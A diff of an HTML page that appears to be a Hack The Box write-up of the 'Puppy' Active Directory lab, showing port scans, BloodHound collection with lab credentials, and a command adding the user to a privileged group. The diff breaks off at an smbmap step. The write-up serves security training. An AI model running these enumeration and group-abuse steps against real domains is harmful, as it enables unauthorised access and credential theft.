@@ -3,353 +3,72 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <meta http-equiv="X-UA-Compatible" content="ie=edge">
   <title>Hack The Box :: Puppy Writeup — Hackthekat</title>
   <meta name="description" content="HTB Puppy machine writeup by Hackthekat">
   <link href="https://cdnjs.cloudflare.com/ajax/libs/flag-icon-css/3.5.0/css/flag-icon.min.css" rel="stylesheet" type="text/css">
   <link rel="stylesheet" href="/main.css">
   <link rel="icon" type="image/png" href="/favicon.ico">
   <style>
-    /* ===== HTB WRITEUP PAGE ===== */
-    :root {
-      --htb-green: #9fef00;
-      --htb-green-soft: rgba(159,239,0,0.1);
-      --htb-bg: #0a0e14;
-      --htb-card: #11161d;
-      --htb-card-hover: #161c24;
-      --htb-border: #1f2832;
-      --htb-text: #c9d1d9;
-      --htb-muted: #6b7785;
-      --htb-easy: #9fef00;
-      --htb-medium: #ffaf00;
-      --htb-hard: #ff3838;
-      --htb-insane: #b372ff;
-      --htb-code-bg: #0d1117;
-    }
-
+    :root { --htb-green: #9fef00; --htb-bg: #0a0e14; --htb-card: #11161d; --htb-card-hover: #161c24; --htb-border: #1f2832; --htb-text: #c9d1d9; --htb-muted: #6b7785; --htb-easy: #9fef00; --htb-medium: #ffaf00; --htb-hard: #ff3838; --htb-insane: #b372ff; --htb-code-bg: #0d1117; }
     *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
-
-    body {
-      background: var(--htb-bg);
-      color: var(--htb-text);
-      font-family: 'Inter', 'Segoe UI', system-ui, -apple-system, sans-serif;
-      font-size: 16px;
-      line-height: 1.7;
-      min-height: 100vh;
-    }
-
+    body { background: var(--htb-bg); color: var(--htb-text); font-family: 'Inter','Segoe UI', system-ui, sans-serif; font-size: 16px; line-height: 1.7; min-height: 100vh; }
     a { color: var(--htb-green); text-decoration: none; }
     a:hover { text-decoration: underline; }
-
-    /* ===== TOP NAV ===== */
-    .writeup-nav {
-      position: sticky;
-      top: 0;
-      z-index: 100;
-      background: rgba(10,14,20,0.95);
-      backdrop-filter: blur(10px);
-      border-bottom: 1px solid var(--htb-border);
-      padding: 0.9rem 2rem;
-      display: flex;
-      align-items: center;
-      gap: 1rem;
-    }
-    .writeup-nav .logo {
-      font-family: 'Monaco','Menlo','Courier New',monospace;
-      color: var(--htb-green);
-      font-size: 1.05rem;
-      font-weight: 700;
-      letter-spacing: 1px;
-    }
+    code { font-family: 'Monaco','Menlo',monospace; font-size: 0.88em; color: var(--htb-green); background: rgba(159,239,0,0.08); padding: 0.1em 0.35em; border-radius: 3px; }
+    .writeup-nav { position: sticky; top: 0; z-index: 100; background: rgba(10,14,20,0.95); backdrop-filter: blur(10px); border-bottom: 1px solid var(--htb-border); padding: 0.9rem 2rem; display: flex; align-items: center; gap: 1rem; }
+    .writeup-nav .logo { font-family: 'Monaco','Menlo',monospace; color: var(--htb-green); font-size: 1.05rem; font-weight: 700; letter-spacing: 1px; }
     .writeup-nav .logo span { color: #fff; }
     .nav-sep { color: var(--htb-muted); margin: 0 0.2rem; }
     .nav-breadcrumb { color: var(--htb-muted); font-size: 0.9rem; }
     .nav-breadcrumb a { color: var(--htb-muted); }
     .nav-breadcrumb a:hover { color: var(--htb-green); }
-
-    /* ===== HERO ===== */
-    .writeup-hero {
-      position: relative;
-      background: radial-gradient(ellipse at top, rgba(159,239,0,0.07), transparent 55%),
-                  linear-gradient(180deg, #0a0e14 0%, #0a0e14 100%);
-      padding: 4.5rem 2rem 3.5rem;
-      border-bottom: 1px solid var(--htb-border);
-      overflow: hidden;
-    }
-    .writeup-hero::before {
-      content: '';
-      position: absolute;
-      inset: 0;
-      background-image:
-        linear-gradient(rgba(159,239,0,0.025) 1px, transparent 1px),
-        linear-gradient(90deg, rgba(159,239,0,0.025) 1px, transparent 1px);
-      background-size: 40px 40px;
-      pointer-events: none;
-      mask-image: radial-gradient(ellipse at center, black 30%, transparent 75%);
-      -webkit-mask-image: radial-gradient(ellipse at center, black 30%, transparent 75%);
-    }
-    .writeup-hero-inner {
-      position: relative;
-      z-index: 1;
-      max-width: 860px;
-      margin: 0 auto;
-      text-align: center;
-    }
-    .writeup-hero-prompt {
-      font-family: 'Monaco','Menlo','Courier New',monospace;
-      color: var(--htb-green);
-      font-size: 0.9rem;
-      margin-bottom: 1.2rem;
-      opacity: 0.8;
-    }
+    .writeup-hero { position: relative; background: radial-gradient(ellipse at top, rgba(159,239,0,0.07), transparent 55%); padding: 4.5rem 2rem 3.5rem; border-bottom: 1px solid var(--htb-border); overflow: hidden; }
+    .writeup-hero::before { content: ''; position: absolute; inset: 0; background-image: linear-gradient(rgba(159,239,0,0.025) 1px, transparent 1px), linear-gradient(90deg, rgba(159,239,0,0.025) 1px, transparent 1px); background-size: 40px 40px; pointer-events: none; mask-image: radial-gradient(ellipse at center, black 30%, transparent 75%); -webkit-mask-image: radial-gradient(ellipse at center, black 30%, transparent 75%); }
+    .writeup-hero-inner { position: relative; z-index: 1; max-width: 860px; margin: 0 auto; text-align: center; }
+    .writeup-hero-prompt { font-family: 'Monaco','Menlo',monospace; color: var(--htb-green); font-size: 0.9rem; margin-bottom: 1.2rem; opacity: 0.8; }
     .writeup-hero-prompt::before { content: '> '; }
-    .writeup-hero h1 {
-      font-size: 3.5rem;
-      font-weight: 700;
-      color: #fff;
-      letter-spacing: -1.5px;
-      line-height: 1.1;
-      margin-bottom: 1.2rem;
-    }
+    .writeup-hero h1 { font-size: 3.5rem; font-weight: 700; color: #fff; letter-spacing: -1.5px; line-height: 1.1; margin-bottom: 1.2rem; }
     .writeup-hero h1 .accent { color: var(--htb-green); }
-    .writeup-badges {
-      display: flex;
-      justify-content: center;
-      gap: 0.6rem;
-      flex-wrap: wrap;
-      margin-bottom: 1.5rem;
-    }
-    .htb-badge {
-      font-size: 0.72rem;
-      padding: 0.25rem 0.75rem;
-      border-radius: 4px;
-      font-weight: 700;
-      text-transform: uppercase;
-      letter-spacing: 0.8px;
-      font-family: 'Monaco','Menlo',monospace;
-    }
+    .writeup-badges { display: flex; justify-content: center; gap: 0.6rem; flex-wrap: wrap; margin-bottom: 1.5rem; }
+    .htb-badge { font-size: 0.72rem; padding: 0.25rem 0.75rem; border-radius: 4px; font-weight: 700; text-transform: uppercase; letter-spacing: 0.8px; font-family: 'Monaco','Menlo',monospace; }
     .os-linux { background: rgba(159,239,0,0.12); color: var(--htb-green); border: 1px solid rgba(159,239,0,0.35); }
     .os-windows { background: rgba(0,153,255,0.12); color: #0099ff; border: 1px solid rgba(0,153,255,0.35); }
     .diff-easy { background: rgba(159,239,0,0.12); color: var(--htb-easy); border: 1px solid rgba(159,239,0,0.35); }
     .diff-medium { background: rgba(255,175,0,0.12); color: var(--htb-medium); border: 1px solid rgba(255,175,0,0.35); }
     .diff-hard { background: rgba(255,56,56,0.12); color: var(--htb-hard); border: 1px solid rgba(255,56,56,0.35); }
     .diff-insane { background: rgba(179,114,255,0.12); color: var(--htb-insane); border: 1px solid rgba(179,114,255,0.35); }
-    .writeup-hero-tagline {
-      color: var(--htb-muted);
-      font-size: 0.95rem;
-      font-family: 'Monaco','Menlo',monospace;
-    }
-
-    /* ===== LAYOUT ===== */
-    .writeup-layout {
-      max-width: 860px;
-      margin: 0 auto;
-      padding: 3rem 2rem 5rem;
-    }
-
-    /* ===== CONTENT TYPOGRAPHY ===== */
-    .writeup-body p {
-      color: var(--htb-text);
-      margin: 1rem 0;
-      line-height: 1.75;
-    }
-    .writeup-body h2.writeup-section-title {
-      font-size: 1.75rem;
-      font-weight: 700;
-      color: #fff;
-      margin: 3rem 0 1rem;
-      padding-bottom: 0.6rem;
-      border-bottom: 1px solid var(--htb-border);
-      letter-spacing: -0.3px;
-    }
-    .writeup-body h2.writeup-section-title::before {
-      content: '# ';
-      color: var(--htb-green);
-      font-family: 'Monaco','Menlo',monospace;
-      font-size: 1.1rem;
-    }
-    .writeup-body h3.writeup-sub-title {
-      font-size: 1.2rem;
-      font-weight: 600;
-      color: #e6edf3;
-      margin: 2rem 0 0.75rem;
-    }
-    .writeup-body h3.writeup-sub-title::before {
-      content: '## ';
-      color: var(--htb-green);
-      font-family: 'Monaco','Menlo',monospace;
-      font-size: 0.85rem;
-      opacity: 0.7;
-    }
-    .writeup-body h4.writeup-step-title {
-      font-size: 1rem;
-      font-weight: 600;
-      color: var(--htb-green);
-      margin: 1.5rem 0 0.5rem;
-      font-family: 'Monaco','Menlo',monospace;
-      letter-spacing: 0.3px;
-    }
+    .writeup-hero-tagline { color: var(--htb-muted); font-size: 0.95rem; font-family: 'Monaco','Menlo',monospace; }
+    .writeup-layout { max-width: 860px; margin: 0 auto; padding: 3rem 2rem 5rem; }
+    .writeup-body p { color: var(--htb-text); margin: 1rem 0; line-height: 1.75; }
+    .writeup-body h2.writeup-section-title { font-size: 1.75rem; font-weight: 700; color: #fff; margin: 3rem 0 1rem; padding-bottom: 0.6rem; border-bottom: 1px solid var(--htb-border); letter-spacing: -0.3px; }
+    .writeup-body h2.writeup-section-title::before { content: '# '; color: var(--htb-green); font-family: 'Monaco','Menlo',monospace; font-size: 1.1rem; }
+    .writeup-body h3.writeup-sub-title { font-size: 1.2rem; font-weight: 600; color: #e6edf3; margin: 2rem 0 0.75rem; }
+    .writeup-body h3.writeup-sub-title::before { content: '## '; color: var(--htb-green); font-family: 'Monaco','Menlo',monospace; font-size: 0.85rem; opacity: 0.7; }
+    .writeup-body h4.writeup-step-title { font-size: 1rem; font-weight: 600; color: var(--htb-green); margin: 1.5rem 0 0.5rem; font-family: 'Monaco','Menlo',monospace; letter-spacing: 0.3px; }
     .writeup-body h4.writeup-step-title::before { content: '→ '; opacity: 0.7; }
-
-    /* ===== CODE BLOCKS ===== */
-    .code-block {
-      background: var(--htb-code-bg);
-      border: 1px solid var(--htb-border);
-      border-radius: 8px;
-      margin: 1.2rem 0;
-      overflow: hidden;
-      position: relative;
-    }
-    .code-block::before {
-      content: '';
-      display: block;
-      height: 3px;
-      background: linear-gradient(90deg, var(--htb-green), transparent);
-    }
-    .code-block pre {
-      padding: 1.2rem 1.5rem;
-      overflow-x: auto;
-      margin: 0;
-    }
-    .code-block pre code {
-      font-family: 'Monaco','Menlo','Courier New',monospace;
-      font-size: 0.82rem;
-      color: #e6edf3;
-      line-height: 1.6;
-      white-space: pre;
-    }
-
-    /* ===== SCREENSHOTS ===== */
-    .screenshot-wrap {
-      margin: 1.5rem 0;
-      background: var(--htb-card);
-      border: 1px solid var(--htb-border);
-      border-radius: 8px;
-      overflow: hidden;
-    }
-    .screenshot-wrap img {
-      width: 100%;
-      height: auto;
-      display: block;
-    }
-    .img-caption {
-      display: block;
-      padding: 0.5rem 1rem;
-      font-size: 0.8rem;
-      color: var(--htb-muted);
-      font-style: italic;
-      border-top: 1px solid var(--htb-border);
-    }
-
-    /* ===== FLAG BOXES ===== */
-    .flag-box {
-      background: rgba(159,239,0,0.06);
-      border: 1px solid rgba(159,239,0,0.3);
-      border-left: 4px solid var(--htb-green);
-      border-radius: 8px;
-      padding: 1rem 1.5rem;
-      margin: 1.5rem 0;
-      display: flex;
-      align-items: center;
-      gap: 1rem;
-      flex-wrap: wrap;
-    }
-    .flag-label {
-      font-size: 0.85rem;
-      font-weight: 700;
-      color: var(--htb-green);
-      font-family: 'Monaco','Menlo',monospace;
-      text-transform: uppercase;
-      letter-spacing: 0.5px;
-      white-space: nowrap;
-    }
-    .flag-value {
-      font-family: 'Monaco','Menlo',monospace;
-      font-size: 0.8rem;
-      color: #e6edf3;
-      background: rgba(0,0,0,0.3);
-      padding: 0.2rem 0.6rem;
-      border-radius: 4px;
-      word-break: break-all;
-    }
-
-    /* ===== ROOTED BOX ===== */
-    .rooted-box {
-      background: rgba(159,239,0,0.08);
-      border: 1px solid var(--htb-green);
-      border-radius: 8px;
-      padding: 1.2rem 1.5rem;
-      margin: 2rem 0;
-      text-align: center;
-      font-size: 1.2rem;
-      font-weight: 700;
-      color: var(--htb-green);
-      font-family: 'Monaco','Menlo',monospace;
-      letter-spacing: 1px;
-    }
-
-    /* ===== INFO CARD (Machine Info) ===== */
-    .machine-info-card {
-      background: var(--htb-card);
-      border: 1px solid var(--htb-border);
-      border-radius: 12px;
-      padding: 1.5rem 2rem;
-      margin: 0 0 2.5rem 0;
-    }
-    .machine-info-card table {
-      width: 100%;
-      border-collapse: collapse;
-    }
-    .machine-info-card td {
-      padding: 0.4rem 1rem 0.4rem 0;
-      color: var(--htb-text);
-      font-size: 0.9rem;
-      vertical-align: top;
-    }
-    .machine-info-card td:first-child {
-      color: var(--htb-muted);
-      font-family: 'Monaco','Menlo',monospace;
-      font-size: 0.82rem;
-      white-space: nowrap;
-      width: 130px;
-    }
-
-    /* ===== BACK BUTTON ===== */
-    .back-link {
-      display: inline-flex;
-      align-items: center;
-      gap: 0.5rem;
-      color: var(--htb-muted);
-      font-size: 0.9rem;
-      font-family: 'Monaco','Menlo',monospace;
-      margin-bottom: 2.5rem;
-      transition: color 0.2s;
-    }
+    .code-block { background: var(--htb-code-bg); border: 1px solid var(--htb-border); border-radius: 8px; margin: 1.2rem 0; overflow: hidden; position: relative; }
+    .code-block::before { content: ''; display: block; height: 3px; background: linear-gradient(90deg, var(--htb-green), transparent); }
+    .code-block pre { padding: 1.2rem 1.5rem; overflow-x: auto; margin: 0; }
+    .code-block pre code { font-family: 'Monaco','Menlo',monospace; font-size: 0.82rem; color: #e6edf3; line-height: 1.6; white-space: pre; background: none; padding: 0; }
+    .screenshot-wrap { margin: 1.5rem 0; background: var(--htb-card); border: 1px solid var(--htb-border); border-radius: 8px; overflow: hidden; }
+    .screenshot-wrap img { width: 100%; height: auto; display: block; }
+    .img-caption { display: block; padding: 0.5rem 1rem; font-size: 0.8rem; color: var(--htb-muted); font-style: italic; border-top: 1px solid var(--htb-border); }
+    .flag-box { background: rgba(159,239,0,0.06); border: 1px solid rgba(159,239,0,0.3); border-left: 4px solid var(--htb-green); border-radius: 8px; padding: 1rem 1.5rem; margin: 1.5rem 0; display: flex; align-items: center; gap: 1rem; flex-wrap: wrap; }
+    .flag-label { font-size: 0.85rem; font-weight: 700; color: var(--htb-green); font-family: 'Monaco','Menlo',monospace; text-transform: uppercase; letter-spacing: 0.5px; white-space: nowrap; }
+    .flag-value { font-family: 'Monaco','Menlo',monospace; font-size: 0.8rem; color: #e6edf3; background: rgba(0,0,0,0.3); padding: 0.2rem 0.6rem; border-radius: 4px; word-break: break-all; }
+    .rooted-box { background: rgba(159,239,0,0.08); border: 1px solid var(--htb-green); border-radius: 8px; padding: 1.2rem 1.5rem; margin: 2rem 0; text-align: center; font-size: 1.2rem; font-weight: 700; color: var(--htb-green); font-family: 'Monaco','Menlo',monospace; letter-spacing: 1px; }
+    .back-link { display: inline-flex; align-items: center; gap: 0.5rem; color: var(--htb-muted); font-size: 0.9rem; font-family: 'Monaco','Menlo',monospace; margin-bottom: 2.5rem; transition: color 0.2s; }
     .back-link:hover { color: var(--htb-green); text-decoration: none; }
-    .back-link::before { content: '←'; }
-
-    /* ===== RESPONSIVE ===== */
-    @media (max-width: 768px) {
-      .writeup-hero h1 { font-size: 2.4rem; }
-      .writeup-layout { padding: 2rem 1.2rem 4rem; }
-      .writeup-nav { padding: 0.8rem 1.2rem; }
-    }
+    .back-link::before { content: '← '; }
+    @media (max-width: 768px) { .writeup-hero h1 { font-size: 2.4rem; } .writeup-layout { padding: 2rem 1.2rem 4rem; } .writeup-nav { padding: 0.8rem 1.2rem; } }
   </style>
 </head>
 <body>
-
-  <!-- Navigation -->
   <nav class="writeup-nav">
     <a href="/" class="logo">> <span>hackthekat</span></a>
     <span class="nav-sep">/</span>
-    <span class="nav-breadcrumb">
-      <a href="/writeups/">writeups</a>
-      <span class="nav-sep">/</span>
-      puppy
-    </span>
+    <span class="nav-breadcrumb"><a href="/writeups/">writeups</a><span class="nav-sep">/</span>puppy</span>
   </nav>
-
-  <!-- Hero -->
   <div class="writeup-hero">
     <div class="writeup-hero-inner">
       <div class="writeup-hero-prompt">hackthekat — writeup</div>
@@ -361,118 +80,105 @@
       <div class="writeup-hero-tagline">Penetration Testing Writeup</div>
     </div>
   </div>
-
-  <!-- Main Content -->
   <div class="writeup-layout">
-    <a href="/writeups/" class="back-link"> Back to all writeups</a>
-
+    <a href="/writeups/" class="back-link">Back to all writeups</a>
     <div class="writeup-body">
-      <div class="machine-info-card">
-        <table>
-          <tr><td>Machine</td><td><strong>Puppy</strong></td></tr>
-          <tr><td>Difficulty</td><td><span class="htb-badge diff-medium">Medium</span></td></tr>
-          <tr><td>OS</td><td><span class="htb-badge os-windows">Windows</span></td></tr>
-          <tr><td>Credentials</td><td><code style="font-size:0.85rem;color:var(--htb-green)">levi.james / KingofAkron2025! Initial Enumeration Port Scanning Full Port scan As always, I will start with a full port scan. With this we will start to see what ports are open on this ip address. nmap -p- 10.129.217.5</code></td></tr>
-          <tr><td>Note</td><td style="color:var(--htb-muted);font-size:0.85rem">This is an assumed breach scenario — credentials are provided by HTB.</td></tr>
-        </table>
-      </div>
+      <h2 class="writeup-section-title">Machine Overview</h2>
+      <p>Puppy is a Medium difficulty Windows AD machine. Starting with provided credentials, the attack path involves BloodHound reconnaissance, adding yourself to the <strong>Developers</strong> group, accessing a <strong>KeePass database</strong> on an SMB share, and using the credentials within to perform a <strong>Targeted Kerberoast</strong>. User flag is obtained via Evil-WinRM. Escalation continues through <strong>DPAPI credential decryption</strong> — finding a master key and credential file via winPEAS, then using <code>dpapi.py</code> to recover a privileged admin account's password.</p>
       <h2 class="writeup-section-title">Initial Enumeration</h2>
-      <p>As is common in real life pentests, you will start the Puppy box with credentials for the following account: levi.james / KingofAkron2025!</p>
       <h3 class="writeup-sub-title">Port Scanning</h3>
-      <h4 class="writeup-step-title">Full Port scan</h4>
-      <p>As always, I will start with a full port scan. With this we will start to see what ports are open on this ip address.</p>
-      <div class="code-block"><pre><code>nmap -p- 10.129.217.5 
+      <p>I start with a full port scan. This is an assumed-breach scenario with credentials: <code>levi.james / KingofAkron2025!</code>.</p>
+      <div class="code-block"><pre><code>nmap -p- 10.129.217.5             
 Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-19 18:49 CEST
 Nmap scan report for 10.129.217.5
 Host is up (0.025s latency).
 Not shown: 65512 filtered tcp ports (no-response)
-PORT STATE SERVICE
-53/tcp open domain
-88/tcp open kerberos-sec
-111/tcp open rpcbind
-135/tcp open msrpc
-139/tcp open netbios-ssn
-389/tcp open ldap
-445/tcp open microsoft-ds
-464/tcp open kpasswd5
-593/tcp open http-rpc-epmap
-636/tcp open ldapssl
-2049/tcp open nfs
-3260/tcp open iscsi
-3268/tcp open globalcatLDAP
-3269/tcp open globalcatLDAPssl
-5985/tcp open wsman
-9389/tcp open adws
-49664/tcp open unknown
-49667/tcp open unknown
-49669/tcp open unknown
-49670/tcp open unknown
-49690/tcp open unknown
-60721/tcp open unknown
-60736/tcp open unknown
+PORT      STATE SERVICE
+53/tcp    open  domain
+88/tcp    open  kerberos-sec
+111/tcp   open  rpcbind
+135/tcp   open  msrpc
+139/tcp   open  netbios-ssn
+389/tcp   open  ldap
+445/tcp   open  microsoft-ds
+464/tcp   open  kpasswd5
+593/tcp   open  http-rpc-epmap
+636/tcp   open  ldapssl
+2049/tcp  open  nfs
+3260/tcp  open  iscsi
+3268/tcp  open  globalcatLDAP
+3269/tcp  open  globalcatLDAPssl
+5985/tcp  open  wsman
+9389/tcp  open  adws
+49664/tcp open  unknown
+49667/tcp open  unknown
+49669/tcp open  unknown
+49670/tcp open  unknown
+49690/tcp open  unknown
+60721/tcp open  unknown
+60736/tcp open  unknown
 
 Nmap done: 1 IP address (1 host up) scanned in 105.15 seconds</code></pre></div>
-      <h4 class="writeup-step-title">Detailed port scan</h4>
-      <p>At the detailed port scan go to get more information from the services that are open on the ip address.</p>
+      <p>A detailed service-version scan (<code>-sCV</code>) fingerprints the exact software versions running on each open port, helping identify potential vulnerabilities.</p>
       <div class="code-block"><pre><code>nmap -p53,88,111,135,139,389,445,464,593,636,2049,3260,3268,3269,5985,9389 -sCV 10.129.217.5 -vvvv
 Host is up, received echo-reply ttl 127 (0.046s latency).
 Scanned at 2025-05-19 18:53:35 CEST for 182s
 
 Bug in iscsi-info: no string output.
-PORT STATE SERVICE REASON VERSION
-53/tcp open domain syn-ack ttl 127 Simple DNS Plus
-88/tcp open kerberos-sec syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2025-05-19 23:55:12Z)
-111/tcp open rpcbind syn-ack ttl 127 2-4 (RPC #100000)
+PORT     STATE SERVICE       REASON          VERSION
+53/tcp   open  domain        syn-ack ttl 127 Simple DNS Plus
+88/tcp   open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2025-05-19 23:55:12Z)
+111/tcp  open  rpcbind       syn-ack ttl 127 2-4 (RPC #100000)
 | rpcinfo: 
-| program version port/proto service
-| 100000 2,3,4 111/tcp rpcbind
-| 100000 2,3,4 111/tcp6 rpcbind
-| 100000 2,3,4 111/udp rpcbind
-| 100000 2,3,4 111/udp6 rpcbind
-| 100003 2,3 2049/udp nfs
-| 100003 2,3 2049/udp6 nfs
-| 100005 1,2,3 2049/udp mountd
-| 100005 1,2,3 2049/udp6 mountd
-| 100021 1,2,3,4 2049/tcp nlockmgr
-| 100021 1,2,3,4 2049/tcp6 nlockmgr
-| 100021 1,2,3,4 2049/udp nlockmgr
-| 100021 1,2,3,4 2049/udp6 nlockmgr
-| 100024 1 2049/tcp status
-| 100024 1 2049/tcp6 status
-| 100024 1 2049/udp status
-|_ 100024 1 2049/udp6 status
-135/tcp open msrpc syn-ack ttl 127 Microsoft Windows RPC
-139/tcp open netbios-ssn syn-ack ttl 127 Microsoft Windows netbios-ssn
-389/tcp open ldap syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: PUPPY.HTB0., Site: Default-First-Site-Name)
-445/tcp open microsoft-ds? syn-ack ttl 127
-464/tcp open kpasswd5? syn-ack ttl 127
-593/tcp open ncacn_http syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
-636/tcp open tcpwrapped syn-ack ttl 127
-2049/tcp open nlockmgr syn-ack ttl 127 1-4 (RPC #100021)
-3260/tcp open iscsi? syn-ack ttl 127
-3268/tcp open ldap syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: PUPPY.HTB0., Site: Default-First-Site-Name)
-3269/tcp open tcpwrapped syn-ack ttl 127
-5985/tcp open http syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|   program version    port/proto  service
+|   100000  2,3,4        111/tcp   rpcbind
+|   100000  2,3,4        111/tcp6  rpcbind
+|   100000  2,3,4        111/udp   rpcbind
+|   100000  2,3,4        111/udp6  rpcbind
+|   100003  2,3         2049/udp   nfs
+|   100003  2,3         2049/udp6  nfs
+|   100005  1,2,3       2049/udp   mountd
+|   100005  1,2,3       2049/udp6  mountd
+|   100021  1,2,3,4     2049/tcp   nlockmgr
+|   100021  1,2,3,4     2049/tcp6  nlockmgr
+|   100021  1,2,3,4     2049/udp   nlockmgr
+|   100021  1,2,3,4     2049/udp6  nlockmgr
+|   100024  1           2049/tcp   status
+|   100024  1           2049/tcp6  status
+|   100024  1           2049/udp   status
+|_  100024  1           2049/udp6  status
+135/tcp  open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
+139/tcp  open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
+389/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: PUPPY.HTB0., Site: Default-First-Site-Name)
+445/tcp  open  microsoft-ds? syn-ack ttl 127
+464/tcp  open  kpasswd5?     syn-ack ttl 127
+593/tcp  open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
+636/tcp  open  tcpwrapped    syn-ack ttl 127
+2049/tcp open  nlockmgr      syn-ack ttl 127 1-4 (RPC #100021)
+3260/tcp open  iscsi?        syn-ack ttl 127
+3268/tcp open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: PUPPY.HTB0., Site: Default-First-Site-Name)
+3269/tcp open  tcpwrapped    syn-ack ttl 127
+5985/tcp open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
 |_http-title: Not Found
 |_http-server-header: Microsoft-HTTPAPI/2.0
-9389/tcp open mc-nmf syn-ack ttl 127 .NET Message Framing
+9389/tcp open  mc-nmf        syn-ack ttl 127 .NET Message Framing
 Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows
 
 Host script results:
 | p2p-conficker: 
-| Checking for Conficker.C or higher...
-| Check 1 (port 53557/tcp): CLEAN (Timeout)
-| Check 2 (port 15127/tcp): CLEAN (Timeout)
-| Check 3 (port 55197/udp): CLEAN (Timeout)
-| Check 4 (port 14697/udp): CLEAN (Timeout)
-|_ 0/4 checks are positive: Host is CLEAN or ports are blocked
+|   Checking for Conficker.C or higher...
+|   Check 1 (port 53557/tcp): CLEAN (Timeout)
+|   Check 2 (port 15127/tcp): CLEAN (Timeout)
+|   Check 3 (port 55197/udp): CLEAN (Timeout)
+|   Check 4 (port 14697/udp): CLEAN (Timeout)
+|_  0/4 checks are positive: Host is CLEAN or ports are blocked
 |_clock-skew: 7h01m29s
 | smb2-time: 
-| date: 2025-05-19T23:57:00
-|_ start_date: N/A
+|   date: 2025-05-19T23:57:00
+|_  start_date: N/A
 | smb2-security-mode: 
-| 3:1:1: 
-|_ Message signing enabled and required
+|   3:1:1: 
+|_    Message signing enabled and required
 
 NSE: Script Post-scanning.
 NSE: Starting runlevel 1 (of 3) scan.
@@ -487,67 +193,65 @@ Completed NSE at 18:56, 0.00s elapsed
 Read data files from: /usr/share/nmap
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 181.51 seconds
- Raw packets sent: 20 (856B) | Rcvd: 17 (732B)</code></pre></div>
-      <p>I tried everything. I tried logging in to the smb server, I tried logging in to the windows machine by the credentials that that I got in the beginning of the machine but I could not log in to this. Then I tried to look for the enumerate of the windows machine but this did not work either.
-Now I went to try to go get the data from the ldap server by using the credentials that that I was given and this I was able to do, I went to do this by doing the following command:</p>
+           Raw packets sent: 20 (856B) | Rcvd: 17 (732B)</code></pre></div>
+      <h3 class="writeup-sub-title">BloodHound Data Collection</h3>
+      <p>Standard SMB and LDAP enumeration didn't yield immediate results. I collect LDAP data for BloodHound analysis.</p>
       <div class="code-block"><pre><code>nxc ldap 10.129.217.5 -u &#x27;levi.james&#x27; -p &#x27;KingofAkron2025!&#x27; --bloodhound --collection All --dns-server 10.129.217.5
-SMB 10.129.217.5 445 DC [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:PUPPY.HTB) (signing:True) (SMBv1:False)
-LDAP 10.129.217.5 389 DC [+] PUPPY.HTB\levi.james:KingofAkron2025! 
-LDAP 10.129.217.5 389 DC Resolved collection methods: psremote, session, dcom, objectprops, rdp, acl, group, trusts, localadmin, container
-LDAP 10.129.217.5 389 DC Done in 00M 06S
-LDAP 10.129.217.5 389 DC Compressing output into /home/kali/.nxc/logs/DC_10.129.217.5_2025-05-19_191822_bloodhound.zip</code></pre></div>
-      <p>Now I will start uploading the data that I got on bloodhound.
-In bloodhound I searched for the user whose user creds I already have. Here I have seen that the user is a member of HR@puppy.htb where we have write permissions on the Developers@puppy.htb group.</p>
-      <div class="screenshot-wrap"><img src="assets/Pasted image 20250519193233.png" alt="Pasted image 20250519193233.png" loading="lazy" /><span class="img-caption">Pasted image 20250519193233.png</span></div>
-      <p>The code below authenticates to the domain puppy.htb with the username levi.james and the password KingofAkron2025!
-Once logged in, the user levi.james is added to the Developers group.</p>
+SMB         10.129.217.5    445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:PUPPY.HTB) (signing:True) (SMBv1:False)
+LDAP        10.129.217.5    389    DC               [+] PUPPY.HTB\levi.james:KingofAkron2025! 
+LDAP        10.129.217.5    389    DC               Resolved collection methods: psremote, session, dcom, objectprops, rdp, acl, group, trusts, localadmin, container
+LDAP        10.129.217.5    389    DC               Done in 00M 06S
+LDAP        10.129.217.5    389    DC               Compressing output into /home/kali/.nxc/logs/DC_10.129.217.5_2025-05-19_191822_bloodhound.zip</code></pre></div>
+      <div class="screenshot-wrap"><img src="assets/Pasted image 20250519193233.png" alt="BloodHound showing levi.james attack paths" loading="lazy" /><span class="img-caption">BloodHound showing levi.james attack paths</span></div>
+      <p>BloodHound reveals that <code>levi.james</code> can add himself to the <strong>Developers</strong> group. I do this using <code>net rpc group addmem</code>.</p>
       <div class="code-block"><pre><code>└─$ net rpc group addmem &quot;Developers&quot; &quot;levi.james&quot; -U &quot;puppy.htb&quot;/&quot;levi.james&quot;%&#x27;KingofAkron2025!&#x27; -S &quot;puppy.htb&quot;</code></pre></div>
-      <p>To check that the user has been added to the group you can use the following code.</p>
+      <p>I use <code>net rpc group addmem</code> to remotely add the user to the target Active Directory group. This command authenticates via the SMB protocol using the provided domain credentials and performs the group membership modification on the Domain Controller. After this change, the user inherits all permissions associated with the new group.</p>
       <div class="code-block"><pre><code>net rpc group members &quot;developers&quot; -U &quot;puppy.htb&quot;/&quot;levi.james&quot;%&#x27;KingofAkron2025!&#x27; -S &quot;puppy.htb&quot;
 PUPPY\levi.james
 PUPPY\ant.edwards
 PUPPY\adam.silver
 PUPPY\jamie.williams</code></pre></div>
-      <p>Since I now know that the user has been added to the developers group, I want to verify that I now have access to the DEV Shared drives. I do this by trying to log into the SMB server and view the shared folders.</p>
-      <div class="code-block"><pre><code>smbmap -H puppy.htb -u levi.james -p KingofAkron2025! 
